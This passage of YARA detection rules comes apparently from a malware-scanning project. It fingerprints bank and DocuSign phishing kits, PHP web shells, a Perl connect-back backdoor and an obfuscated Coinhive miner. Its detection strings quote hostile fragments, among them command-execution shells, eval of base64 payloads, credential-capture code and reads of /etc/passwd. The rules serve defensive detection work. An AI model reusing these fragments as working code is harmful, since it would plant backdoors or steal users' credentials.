      $s10 = "return file_put_contents( $this->ipfile, $ip, $comment ); " fullword ascii
      $s11 = "** due to the integer size restrictions of platforms, we" fullword ascii
      $s12 = "** also removes excess spaces from within the string." fullword ascii
      $s13 = "** public function that returns the ip list array" fullword ascii
      $s14 = "**      boolean ipPass( <ipaddress> )" fullword ascii
      $s15 = "$dnetmask = ~(pow( 2, ( 32 - $netmask)) - 1);" fullword ascii
      $s16 = "$blacklistfile = 'includes/blacklist.dat' ) {" fullword ascii
      $s17 = "throw new Exception( $fname.': '.$e->getmessage() . '\\n');" fullword ascii
      $s18 = "// Created by legzy -- icq: 692561824 " fullword ascii
      $s19 = "**      If whitelist and blacklist filenames are not provided, they will" fullword ascii
      $s20 = "**  class IpBlockList( <whitelistfile>, <blacklistfile> );" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_phishing_functions {
   meta:
      description = "phishing - file functions.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "ac14e54b724e7990ea298f51472ec7c41b721740d19ac2a53706b3050893d386"
   strings:
      $x1 = "$ipDetails = json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip=\" . $ipAddress), true);" fullword ascii
      $s2 = "$bankDetails = json_decode(file_get_contents(\"http://www.binlist.net/json/\" . $cardBIN), true);" fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s4 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 1083) AppleWebKit/536.28.4 (KHTML like Gecko) Version/6.0.3 Safari/536.28.4" fullword ascii
      $s5 = "$systemInfo['useragent'] = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s6 = "$uagent = strtolower($uagent ? $uagent : $_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 1082) AppleWebKit/537.11 (KHTML like Gecko) Chrome/23.0.1271.10 Safari/537.11" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17" fullword ascii
      $s9 = "if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))" fullword ascii
      $s10 = "elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {" fullword ascii
      $s11 = "$systemInfo['os'] = os_info($systemInfo['useragent']);" fullword ascii
      $s12 = "// Next get the name of the useragent yes seperately and for good reason" fullword ascii
      $s13 = "$browserName = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s14 = "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02" fullword ascii
      $s15 = "Opera/9.80 (Windows NT 6.2; U; en) Presto/2.10.289 Version/12.01" fullword ascii
      $s16 = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)" fullword ascii
      $s17 = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" fullword ascii
      $s18 = "$randomString .= $characters[rand(0, strlen($characters) - 1)];" fullword ascii
      $s19 = "$u_agent = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s20 = "if (strripos($u_agent,\"Version\") < strripos($u_agent,$ub)){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_phishing_ip_range_check {
   meta:
      description = "phishing - file ip_range_check.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "22190ec22232bc1eb79e856b0e5ffe967aeb4b82fe688f1b1e7dcc0939d1c304"
   strings:
      $s1 = "redirectTo(\"Login.php?public/enroll/IdentifyUser-aspx-LOB=RBGLogon&\" . generateRandomString(80));" fullword ascii
      $s2 = "fputs($fp, \"IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\\r\\n\");" fullword ascii
      $s3 = "header(\"Location: https://chaseonline.com/\");" fullword ascii
      $s4 = "$fp = fopen(\"logs/accepted_visitors.txt\", \"a\");" fullword ascii
      $s5 = "$fp = fopen(\"logs/denied_visitors.txt\", \"a\");" fullword ascii
      $s6 = "Created by legzy -- icq: 692561824 " fullword ascii
      $s7 = "require_once(\"includes/functions.php\");" fullword ascii
      $s8 = "$msg = \"PASSED: \".$checklist->message();" fullword ascii
      $s9 = "$msg = \"FAILED: \".$checklist->message();" fullword ascii
      $s10 = "$result = $checklist->ipPass( $ip );" fullword ascii
      $s11 = "$_SESSION['page_a_visited'] = true;" fullword ascii
      $s12 = "# Visitor IP range check" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_phishing_visitor_log {
   meta:
      description = "phishing - file visitor_log.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "4a78aef191ca6b029c8aa815d21924e7ce856c2cc5823c743a399b0cff6b7c37"
   strings:
      $s1 = "fputs($fp, \"IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\\r\\n\");" fullword ascii
      $s2 = "$fp = fopen(\"logs/ips.txt\", \"a\");" fullword ascii
      $s3 = "$v_agent = $_SERVER['HTTP_USER_AGENT'];" fullword ascii
      $s4 = "Created by legzy -- icq: 692561824 " fullword ascii
      $s5 = "$v_ip = $_SERVER['REMOTE_ADDR'];" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_phishing_One_Time {
   meta:
      description = "phishing - file One_Time.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "e49e2e5599cc3b23566af92c4695593147ac21e6e174fdb43e8b224544b7780f"
   strings:
      $s1 = "** private function that reads the file into array" fullword ascii
      $s2 = "header(\"Location: https://chase.com/\");" fullword ascii
      $s3 = "return (($this->compare($dip,$dlow) != -1) && ($this->compare($dip,$dhigh) != 1)); " fullword ascii
      $s4 = "private $statusid = array( 'negative' => -1, 'neutral' => 0, 'positive' => 1 );" fullword ascii
      $s5 = "return file_put_contents( $this->ipfile, $ip, $comment ); " fullword ascii
      $s6 = "** public function that returns the ip list array" fullword ascii
      $s7 = "$dnetmask = ~(pow( 2, ( 32 - $netmask)) - 1);" fullword ascii
      $s8 = "$whitelistfile = 'includes/whitelist.dat', " fullword ascii
      $s9 = "$blacklistfile = 'includes/blacklist.dat' ) {" fullword ascii
      $s10 = "throw new Exception( $fname.': '.$e->getmessage() . '\\n');" fullword ascii
      $s11 = "$temp = explode( \"#\", $line );" fullword ascii
      $s12 = "# create content array" fullword ascii
      $s13 = "# remove comment and blank lines" fullword ascii
      $s14 = "$line = trim( $temp[0] );" fullword ascii
      $s15 = "$retval = $this->whitelistfile->filename( $ip, $comment );" fullword ascii
      $s16 = "$retval = $this->blacklistfile->append( $ip, $comment );" fullword ascii
      $s17 = "$retval = $this->blacklistfile->filename( $ip, $comment );" fullword ascii
      $s18 = "$retval = $this->whitelistfile->append( $ip, $comment );" fullword ascii
      $s19 = "public function filename( $type, $ip, $comment = \"\" ) {" fullword ascii
      $s20 = "$this->message = $ip . \" is whitelisted by \".$this->whitelist->message().\".\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_AES {
   meta:
      description = "phishing - file AES.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "b9b23ddce789047864e215fcbb411646813d9a77721d9c3ea2dc303e036431ef"
   strings:
      $s1 = "$this->cipher, $this->key, base64_decode($this->data), $this->mode, $this->getIV()));" fullword ascii
      $s2 = "$this->cipher, $this->key, $this->data, $this->mode, $this->getIV())));" fullword ascii
      $s3 = "$this->IV = mcrypt_create_iv(mcrypt_get_iv_size($this->cipher, $this->mode), MCRYPT_RAND);" fullword ascii
      $s4 = "* @param type $key" fullword ascii
      $s5 = "function __construct($data = null, $key = null, $blockSize = null, $mode = null) {" fullword ascii
      $s6 = "Created by legzy -- icq: 692561824 " fullword ascii
      $s7 = "* @param type $blockSize" fullword ascii
      $s8 = "* @param type $data" fullword ascii
      $s9 = "* @param type $mode" fullword ascii
      $s10 = "protected function getIV() {" fullword ascii
      $s11 = "public function encrypt() {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _home_hawk_08_27_18_chase2_chase2018_Verification_login_phishing_Login {
   meta:
      description = "phishing - file Login.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "3e17e6bd0d785a7d020922b84c8b49234b0180f80351d383379662ccb179b42e"
   strings:
      $x1 = "<script type=\"text/javascript\" src=\"https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js\"></script>" fullword ascii
      $s2 = "new MaskedPassword(document.getElementById(\"demo-field\"), '\\u25CF');" fullword ascii
      $s3 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-1\">" fullword ascii
      $s4 = "<form action=\"confirm.php?public/enroll/IdentifyUser-aspx-LOB=RBGLogon<?php echo generateRandomString(80); ?>\" name=\"chalbhai" ascii
      $s5 = "\"#\"><img src=\"images/for.png\" alt=\"\" title=\"\" border=\"0\" width=\"205\" height=\"45\"></a></div>" fullword ascii
      $s6 = "\"#\"><img src=\"images/for1.png\" alt=\"\" title=\"\" border=\"0\" width=\"1365\" height=\"189\"></a></div>" fullword ascii
      $s7 = "document.getElementById('demo-form').onsubmit = function()" fullword ascii
      $s8 = "<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en-US\" lang=\"en-US\">" fullword ascii
      $s9 = "Created by legzydaboss -- icq 692561824" fullword ascii
      $s10 = "var bodyElems = document.getElementsByTagName(\"body\");" fullword ascii
      $s11 = "images/form.png\" alt=\"\" title=\"\" width=\"1365\" height=\"545\"></div>" fullword ascii
      $s12 = "<form action=\"confirm.php?public/enroll/IdentifyUser-aspx-LOB=RBGLogon<?php echo generateRandomString(80); ?>\" name=\"chalbhai" ascii
      $s13 = "require \"includes/session_protect.php\";" fullword ascii
      $s14 = "<div style=\"position:absolute;left:510px; top:250px; width:148px; z-index:26\">" fullword ascii
      $s15 = "<link rel=\"shortcut icon\" href=\"images/favicoon.ico\"/>" fullword ascii
      $s16 = "//pass the field reference, masking symbol, and character limit" fullword ascii
      $s17 = "44\" height=\"42\" src=\"images/signin.png\"></div>" fullword ascii
      $s18 = "alert('pword = \"' + this.pword.value + '\"');" fullword ascii
      $s19 = "d=\"chalbhai\" method=\"post\">" fullword ascii
      $s20 = "require \"includes/functions.php\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _One_Time_blacklist_lookup_0 {
   meta:
      description = "phishing - from files One_Time.php, blacklist_lookup.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "e49e2e5599cc3b23566af92c4695593147ac21e6e174fdb43e8b224544b7780f"
      hash2 = "921abc8cd5b73ed1f639de236bfa62bf0c6cc3a8a142e403d3e24cd26f110cd4"
   strings:
      $s1 = "** private function that reads the file into array" fullword ascii
      $s2 = "return (($this->compare($dip,$dlow) != -1) && ($this->compare($dip,$dhigh) != 1)); " fullword ascii
      $s3 = "private $statusid = array( 'negative' => -1, 'neutral' => 0, 'positive' => 1 );" fullword ascii
      $s4 = "return file_put_contents( $this->ipfile, $ip, $comment ); " fullword ascii
      $s5 = "** public function that returns the ip list array" fullword ascii
      $s6 = "$dnetmask = ~(pow( 2, ( 32 - $netmask)) - 1);" fullword ascii
      $s7 = "$blacklistfile = 'includes/blacklist.dat' ) {" fullword ascii
      $s8 = "throw new Exception( $fname.': '.$e->getmessage() . '\\n');" fullword ascii
      $s9 = "$temp = explode( \"#\", $line );" fullword ascii
      $s10 = "# create content array" fullword ascii
      $s11 = "# remove comment and blank lines" fullword ascii
      $s12 = "$line = trim( $temp[0] );" fullword ascii
      $s13 = "$retval = $this->whitelistfile->filename( $ip, $comment );" fullword ascii
      $s14 = "$retval = $this->blacklistfile->append( $ip, $comment );" fullword ascii
      $s15 = "$retval = $this->blacklistfile->filename( $ip, $comment );" fullword ascii
      $s16 = "$retval = $this->whitelistfile->append( $ip, $comment );" fullword ascii
      $s17 = "public function filename( $type, $ip, $comment = \"\" ) {" fullword ascii
      $s18 = "$this->message = $ip . \" is whitelisted by \".$this->whitelist->message().\".\";" fullword ascii
      $s19 = "$this->message = $ip . \" is blacklisted by \".$this->blacklist->message().\".\";" fullword ascii
      $s20 = "# remove on line comments" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-23
   Identifier: phishing
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_23_18_citi_phish_INDPBANK_hostname_check {
   meta:
      description = "phishing - file hostname_check.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-23"
      hash1 = "346d452c73b5f477c106db4adf4898c013b2a09ed2d9ac751b6c82d07a33d409"
   strings:
      $s1 = "$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']); //Get User Hostname" fullword ascii
      $s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s3 = "if (substr_count($hostname, $word) > 0) {" fullword ascii
      $s4 = "die(\"<h1>404 Not Found</h1>The page that you have requested could not be found.\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_08_23_18_citi_phish_INDPBANK_phishing_Log {
   meta:
      description = "phishing - file Log.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-23"
      hash1 = "8d529fdadfbaae1249cdfcba67cbc792edf812442583c3a6c71469de4e6ab5cc"
   strings:
      $s1 = "header(\"Location: Logging_in.php?$hostname\").md5(time());" fullword ascii
      $s2 = "header(\"Location: index.php?invalidX$hostname\").md5(time());" fullword ascii
      $s3 = "$hostname = bin2hex ($_SERVER['HTTP_HOST']);" fullword ascii
      $s4 = "$_SESSION['PassCode'] = $PASS = $_POST['Passcode'];" fullword ascii
      $s5 = "$_SESSION['UserID'] = $USER = $_POST['IDUser'];" fullword ascii
      $s6 = "//GET HOST NAME" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

rule dark_shell
{

    meta:
       author = "Brian Laskowski"
       info = " darkshell 05/24/18 "

    strings:
    
	$s1="$items = scandir ($file)"
	$s2="$range = explode"
	$s3="case 'port_scan'"
	$s4="if(move_uploaded_file($temp,$file))"

    condition:
    all of them
}

rule data_chaos_backdoor_shell
{

    meta:
       author = "Brian Laskowski"
       info = " perl backdoor shell 05/21/18 "

    strings:
    
	$s1="/usr/bin/perl"
	$s2="Data Cha0s Connect Back Backdoor"
	$s3="use Socket"

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-05-31
   Identifier: case114
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_day_uploader_shell {
   meta:
      description = "case114 - file 9st48vlvfp.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-31"
      hash1 = "6452039c95cf77d834e2eaa1459abf4e176c1f7158f2b86751138e5bd24e072e"
   strings:
      $s1 = "str_replace" fullword ascii
      $s2 = "eval (gzinflate(base64_decode" ascii
      $s3 = "eval"
      $s4 = "intval(__LINE__)" fullword ascii
      $s5 = "?php"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 5KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-05-29
   Identifier: pythonsymlinker
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_05_29_18_pythonsymlinker_sym {
   meta:
      description = "pythonsymlinker - file sym.py"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "72e092cd8922e74b903de63357b81a49e65c4051aa15bed504b6053525987686"
   strings:
      //$s1 = "(PriVate ByPass ScRiPt)" fullword ascii
      //$s3 = "ips.write(\"<tr><td style=font-family:calibri;font-weight:bold;color:black;>%s</td><td style=font-family:calibri;font-weight:bol" ascii
      $s4 = "ln -s" fullword ascii
      //$s5 = "DedSec.txt" fullword ascii
      $s6 = "open('/etc/passwd','r')" fullword ascii
      $s7 = "get=_blank"
      $s15 = "counter,fusr,fusr,path,fsite" fullword ascii
      $s8 = "ips.write" fullword ascii
      $s9 = "xusr=xusr.replace('/home/','')" ascii
      $s10 = "xxsite=xxsite.replace(\".db\",\"\")" fullword ascii
      $s11 = "ips=open"
      $s12 = "os.system" fullword ascii
      $s13 = "hta ="
      $s16 = ".htaccess" fullword ascii
      $s14 = "path=os.getcwd()" fullword ascii
   condition:
      ( uint16(0) == 0x2020 and
         filesize < 5KB and
         ( 8 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-26
   Identifier: phishing
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_26_18_DocuSign_phishing_hello {
   meta:
      description = "phishing - file hello.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-26"
      hash1 = "dd7e28b3e1c7d175f023e4a0145a083776221d4a78fa5e1f6035a88ad826dfcb"
   strings:
      $s1 = "$headers = 'From: no_reply@mylinklog.com' . \"\\r\\n\";" fullword ascii
      $s2 = "$data .='Password='.\"\"; $data .=$_POST['password'].\"\\n\";" fullword ascii
      $s3 = "$error_messages[] = 'Please fill in your Password.';" fullword ascii
      $s4 = "User Agent: {$_SERVER['HTTP_USER_AGENT']}" fullword ascii
      $s5 = "Password: {$userdata['password']}" fullword ascii
      $s6 = "$to" fullword ascii
      $s7 = "define('FORM_SUBMITTED', (is_array($_POST) && 0 < count($_POST)) );" fullword ascii
      $s8 = "$error_messages[] = 'Please fill in your E-mail Address.';" fullword ascii
      $s9 = "$error_messages[] = 'Sorry, there was a problem sending your email, please try again.';" fullword ascii
      $s10 = "$value = trim($_POST[$key]);" fullword ascii
      $s11 = "foreach ( $userdata as $key => &$value ) {" fullword ascii
      $s12 = "if (!mail($to, $subject, $message, $headers) ) {" fullword ascii
      $s13 = "if ( isset($_POST[$key]) ) {" fullword ascii
      $s14 = "$data .='Email='.\"\"; $data .=$_POST['email'].\"\\n\";" fullword ascii
      $s15 = "// If no error messages have been set then everything must be okay" fullword ascii
      $s16 = "HTTP Referrer: {$userdata['http_referrer']}" fullword ascii
      $s17 = "// Attempt to send the email" fullword ascii
      $s18 = "// If data has been posted for this item:" fullword ascii
      $s19 = "$data .='IP='.\"\"; $data .=$_SERVER[\"REMOTE_ADDR\"].\"\\n\";" fullword ascii
      $s20 = "} elseif ( get_magic_quotes_gpc() ) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 9KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_08_26_18_DocuSign_phishing_index {
   meta:
      description = "phishing - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-26"
      hash1 = "9bb8e5f5e457524283ed2fccd54063a2f645e2209f4beeacc0304ec46a5032f0"
   strings:
      $s1 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\"></head><body hola-ext-player=\"1\"><p>" fullword ascii
      $s2 = "<html hola_ext_inject=\"ready\"><head>" fullword ascii
      $s4 = "<p align=\"center\"><img src=\"img/bar.gif\" height=\"36\" width=\"405\"></p>" fullword ascii
      $s6 = "<img src=\"img/hl.jpg\" height=\"92\" width=\"405\"></p>" fullword ascii
   condition:
      ( uint16(0) == 0x683c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule CPREA57_Webshell

{
        meta:
        author= "Brian Laskowski"
        info= " injection for tech support scam infrastructure"

        strings:
                $a = "error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode("

                $b = "*947353*"
        condition:
                all of them
}

rule ico_injection_detected
{

    meta:
       author = "Brian Laskowski"
       info = " general ico injection 05/18/18 "

    strings:
    
	$s1="<?php"
	$s2="@include"
	//$s3="ic\x6f"
	$s4="drupal_bootstrap"
	$s5="require_once"
	$s6="menu_execute_active_handler"

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-05-30
   Identifier: 05-30-18
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule _infected_05_30_18_drupal_coinhive_malware {
   meta:
      description = "05-30-18 - file drupal.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-30"
      hash1 = "366b4d277b29c4ad47a7a37ea24871a07b5f97d4c85591ced73578e11b67d1d2"
   strings:
      $x1 = "var _0x8aa6=[\"\\x75\\x73\\x65\\x20\\x73\\x74\\x72\\x69\\x63\\x74\",\"\\x70\\x61\\x72\\x61\\x6D\\x73\",\"\\x5F\\x73\\x69\\x74\\x" ascii
      $s2 = "* See http://bugs.jquery.com/ticket/9521" fullword ascii
      $s3 = "allows increasing the size at runtime, or (3) if you want malloc to return NULL (0) instead of this abort, compile with -s ABOR" fullword ascii
      $s4 = "* to be processed, in order to allow special behaviors to detach from the" fullword ascii
      $s5 = "* behaviorName-processed, to ensure the behavior is detached only from" fullword ascii
      $s6 = "* loaded, feeding in an element to be processed, in order to attach all" fullword ascii
      $s7 = "* enables the reprocessing of given elements, which may be needed on occasion" fullword ascii
      $s8 = "* previously processed elements." fullword ascii
      $s9 = "* called by this function, make sure not to pass already-localized strings to it." fullword ascii
      $s10 = "* function before page content is about to be removed, feeding in an element" fullword ascii
      $s11 = "responseText = \"\\n\" + Drupal.t(\"ResponseText: !responseText\", {'!responseText': $.trim(xmlhttp.responseText) } );" fullword ascii
      $s12 = "statusText = \"\\n\" + Drupal.t(\"StatusText: !statusText\", {'!statusText': $.trim(xmlhttp.statusText)});" fullword ascii
      $s13 = "* Drupal.attachBehaviors is added below to the jQuery ready event and so" fullword ascii
      $s14 = "* default non-JavaScript UIs. Behaviors are registered in the Drupal.behaviors" fullword ascii
      $s15 = "60* 1e3};for(var _0x14b7x9=0;_0x14b7x9< this[_0x8aa6[4]][_0x8aa6[60]];_0x14b7x9++){this[_0x8aa6[4]][_0x14b7x9][_0x8aa6[59]]()};" fullword ascii
      $s16 = "function(){return this[_0x8aa6[4]][_0x8aa6[60]]> 0};_0x14b7x2[_0x8aa6[55]][_0x8aa6[90]]= function(){return /mobile|Android|webO" fullword ascii
      $s17 = "* Override jQuery.fn.init to guard against XSS attacks." fullword ascii
      $s18 = "* runs on initial page load. Developers implementing AHAH/Ajax in their" fullword ascii
      $s19 = "var baseUrl = protocol + '//' + location.host + Drupal.settings.basePath.slice(0, -1);" fullword ascii
      $s20 = "* See the documentation of the server-side format_plural() function for further details." fullword ascii
   condition:
      ( uint16(0) == 0x0a0d and
         filesize < 900KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule drupal_CVE_2018_7600_RCE_0
{
	meta: 
	author= "Brian Laskowski"
	info= " Drupal RCE shell"

	strings:
		$a = "echo"
		$b = "<pre>"
		$c = ";system($_GET['c'])"
	
	condition:
		all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-23
   Identifier: case138
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule contextual_2 {
   meta:
      description = "case138 - file contextual-2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "239f1024b21e2d74f75e5e070f306fcd20055e9b209c0c5447745306193f3390"
   strings:
      $x1 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s2 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s3 = "xsser;\");} if(@copy($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"])) { echo \"<b>Upload Complate !!!</b><br>\"; }" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule case138_ps {
   meta:
      description = "case138 - file ps.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "91d3afaf598c91de9fca8de1fe6ecbc55f840d4d485e2cb69479af07a473edc1"
   strings:
      $s1 = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule extenupdates {
   meta:
      description = "case138 - file extenupdates.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "89849fa86fafdf1e5d0947939014f7957bd50194ae9a736d2dae1572752cf1bf"
   strings:
      $s1 = "46451a09d6a32e92505ec55b9e5884e7cc4b611b18a97f4b6680b19498bbcf14ce741f0cb7bdc7e218ef418ff99f8a8c413dd1b2808a5d244b2d74c642d9" ascii
      $s2 = "d30a338dc64376d1adfe8dd73179764bf414de1296223a397d4e96461c2d0b6411161dede7852b8d68930ac12a1f73079949d2f11a573a765d0cc087e4fd" ascii
      $s3 = "$JSubMenu = addFilter(getEntries(_JEXEC), $action);" fullword ascii
      $s4 = "$entries[$i] = chr((ord($entries[$i]) - ord($action[$i])) % 256);" fullword ascii
      $s5 = "ce44b2bf27631a3afcf49e435e291db428f767fea9052698a34ef23a84a1e8acf335ebbf5695601081d9d5a7ab1de68a4aa6d98d652428051f8df8b17e82d" ascii
      $s6 = "8288f5f5b724acb6724766c082122b160e58d723c1329e0e0997dffc6fc702bb24efd4d46f4f9312f547b72a04e6b47c9c3edd142849ff99" ascii
      $s7 = "c760ade020f550b445881b32da49a29ab396bbb1a4589564f3eee93401cf90ac2817ef07399238d4d9103f9bee0492df76dc9fcec4df4fbc5a23a9e" ascii
      $s8 = "50b7fe94d5cd5a3da7ed18c6c9ba653f6098ed55a146b50b7a95aa7912776fc78e504b237b72498e5f263030de939fd5f5c2053476bfdea8f7239" ascii
      $s9 = "21f7c48e71d281b971c11c4074846d5c11164ad784b30b5d341d28937351ef4f6298d9b6594b34d47cb69df31d3d72c1a05e07e9cc7849ed23bd6" ascii
      $s10 = "9c3ed93befb99d2475b3c127dc7866140e9b4bd7b2eacee53a1ea20e0be9c45899a48f5a9e38c51b94f96ad7ee975a63ae9ba144914ac885" ascii
      $s11 = "if(isset($_REQUEST['j_submenu'])) @setcookie('j_submenu', $_REQUEST['j_submenu']);" fullword ascii
      $s12 = "02dae3ffe785d2e32e2e2611df479f8dfd06152a10db32669d45c61b9ab6d98432e9d7c8b7b9cbab3e45bbb3c9745bf0eba3fd8246c4e5" ascii
      $s13 = "d1f1689f91713777f770b83aafc376bf9c629931ec067050e75f6aafa152ce3ddebe3b42b81b423404395f56c7612cda89b8484217948" ascii
      $s14 = "d50a09521f25aeb88a89c555b029be299cf6dc21660c554ad5cd832e11d94d4cbbecbcf3926c6d222e01b2c6a7d716a05beb84a091a5737" ascii
      $s15 = "9d60fb18eb7b9cb52303ab5b3562b996cd60de679782b1a3f99e813c5269a31bf75e6fe0c47122c736f4f5b11ce3d9f0edc7b5c888" ascii
      $s16 = "c9a2b924f4ae1e55979a5bacba683219846c34fe50aef5aaf01d41950fbf3a1289106770ba047c27c7e47544b15c9a2dfc" ascii
      $s17 = "5cea95f39b897a37a8e372d38b7d36fef2e9df24a0bc3bb117eec32bc9bfa44225c288fbcb679da4f84be6b9727bcf5b241812" ascii
      $s18 = "06870f611ae921e3e10707e9b1e2bc0a3715a5178f1d70d0d27ddd15b8fb7bbb9e76b0b3b1541fdf2073651b6f" ascii
      $s19 = "de1296223a397d4e96461c2d0b6411161dede7852b8d68930ac12a1f73079949d2f11a573a765d0cc087e4fd');" fullword ascii
      $s20 = "a9488542c6daa12eeebe8355c501925372a24e04e36e046c7871b468cf0fb9fb60ab9738be8c884fc60dce78351954" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 8 of them )
      ) or ( all of them )
}

rule contextual {
   meta:
      description = "case138 - file contextual.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "352e6308b75f8ed3248fc678724ee839f15e76bd7bc3f368423c21254ab2fffb"
   strings:
